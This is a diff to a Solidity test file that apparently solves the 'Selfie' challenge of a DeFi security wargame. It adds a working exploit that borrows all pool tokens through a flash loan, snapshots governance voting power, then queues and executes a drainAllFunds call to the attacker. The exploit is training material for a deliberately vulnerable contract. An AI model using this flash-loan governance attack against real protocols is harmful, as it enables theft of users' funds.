@@ -47,7 +47,15 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
-
+        // take a loan of all dvt tokens
+        selfiePool.flashLoan(TOKENS_IN_POOL);
+        // now we have the dvt snapshot we can queue an action to drain the funds
+        uint256 actionId = simpleGovernance.queueAction(
+            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0
+        );
+        // fast forward 2 days and execute the action using the actionId
+        vm.warp(block.timestamp + 2 days);
+        simpleGovernance.executeAction(actionId);
         /**
          * EXPLOIT END *
          */
@@ -59,5 +67,11 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+
+    fallback() external {
+        // all we need to do during the flash loan is take a snapshot and return the dvt
+        dvtSnapshot.snapshot();
+        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);
     }
 }
